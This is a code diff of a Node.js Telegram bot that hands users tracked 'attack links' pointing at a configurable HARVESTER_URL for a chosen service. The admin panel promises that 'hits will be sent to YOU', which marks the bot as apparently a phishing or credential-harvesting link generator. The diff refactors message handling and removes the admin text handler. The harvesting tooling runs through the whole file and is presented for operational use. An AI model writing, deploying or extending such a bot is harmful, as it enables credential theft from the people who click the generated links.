@@ -1,7 +1,7 @@
 const { Telegraf, Markup } = require('telegraf');
 const fs = require('fs');
 
-// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
+// --- ⚙️ CONFIGURATION ---
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const HARVESTER_URL = process.env.HARVESTER_URL;
 const OWNER_ID = process.env.OWNER_ID; 
@@ -15,7 +15,6 @@ if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
 
 const bot = new Telegraf(BOT_TOKEN);
 const DB_PATH = './db.json';
-let adminState = {};
 
 // --- DB Functions ---
 const readDb = () => {
@@ -30,7 +29,7 @@ const isAdmin = (userId) => {
     return db.admins.includes(parseInt(userId));
 };
 
-// --- KEYBOARDS (Using Telegraf's Markup for better UI) ---
+// --- KEYBOARDS (Using Telegraf's Markup) ---
 const adminKeyboard = Markup.inlineKeyboard([
     [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
     [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
@@ -63,37 +62,43 @@ bot.start(async (ctx) => {
             db.users[userId] = { username: username, joinDate: new Date().toISOString() };
             writeDb(db);
             // NEW FEATURE: Notification for new user
-            ctx.telegram.sendMessage(OWNER_ID, `➕ **New User Joined**\n\n- **Name:** ${username}\n- **ID:** \`${userId}\``, {parse_mode: 'Markdown'});
+            ctx.telegram.sendMessage(OWNER_ID, `➕ New User Joined: ${username} (ID: ${userId})`);
         }
         
         if (isAdmin(userId)) {
-            ctx.replyWithMarkdown('👑 **Admin Panel** 👑\nWelcome, Operator. All controls are active.', adminKeyboard);
+            ctx.reply('👑 **Admin Panel** 👑\nWelcome, Operator.', { parse_mode: 'Markdown', ...adminKeyboard });
         } else {
-            ctx.replyWithMarkdown('✅ **Welcome!**\nSelect a service below to generate a link.', Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
+            ctx.reply('✅ **Welcome!**\nSelect a service below to generate a link.', { parse_mode: 'Markdown', ...Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)) });
         }
     } catch (error) {
-        ctx.replyWithMarkdown(`🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, Markup.inlineKeyboard([
-            [Markup.button.url('➡️ Join Channel ⬅️', CHANNEL_LINK)],
-            [Markup.button.callback('🔄 Joined! Click to Continue 🔄', 'check_join')]
-        ]));
+        ctx.reply(`🛑 **ACCESS DENIED** 🛑\n\nYou must join our channel to use this bot.`, {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([
+                [Markup.button.url('➡️ Join Channel ⬅️', CHANNEL_LINK)],
+                [Markup.button.callback('🔄 Joined! Click to Continue 🔄', 'check_join')]
+            ])
+        });
     }
 });
 
 // --- Callback Handler for ALL buttons ---
-bot.on('callback_query', async (ctx) => {
+bot.on('callback_query', (ctx) => {
     const userId = ctx.from.id;
     const data = ctx.callbackQuery.data;
-    await ctx.answerCbQuery();
+
+    // Acknowledge the button press to remove the loading icon
+    ctx.answerCbQuery();
 
     if (data === 'check_join') {
-        return ctx.reply("Now please type /start again to verify.");
+        ctx.reply("Now please type /start again to verify.");
+        return;
     }
 
     const [type, command, service] = data.split('_');
 
     if (type === 'gen' && command === 'link') {
         const attackLink = `${HARVESTER_URL}/?service=${service}&uid=${userId}`;
-        return ctx.replyWithMarkdown(`✅ **Link for [${service}]**:\n\`${attackLink}\``);
+        ctx.reply(`✅ **Link for [${service}]**:\n\`${attackLink}\``, { parse_mode: 'Markdown' });
     }
 
     if (isAdmin(userId)) {
@@ -102,31 +107,19 @@ bot.on('callback_query', async (ctx) => {
                 case 'status':
                     const db = readDb();
                     const totalUsers = Object.keys(db.users).length;
-                    return ctx.editMessageText(`📊 **Bot Status**\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
+                    ctx.editMessageText(`📊 **Bot Status**\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
+                    break;
                 case 'generate':
-                    return ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", linkGenerationKeyboard);
+                    ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", { ...linkGenerationKeyboard });
+                    break;
                 case 'panel':
-                    return ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
-                default:
-                    const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
-                    if (prompts[command]) {
-                        adminState[userId] = command;
-                        return ctx.reply(prompts[command]);
-                    }
+                    ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
+                    break;
+                // Add more admin handlers here
             }
         }
     }
 });
-
-// --- Text Handler for Admin Replies ---
-bot.on('text', (ctx) => {
-    const userId = ctx.from.id;
-    const text = ctx.message.text;
-    if (text.startsWith('/') || !adminState[userId]) return;
-
-    // ... (message handler logic waisa hi rahega jaisa pehle tha, bas bot.sendMessage ki jagah ctx.reply hoga) ...
-});
-
 
 // Launch the bot
 bot.launch();
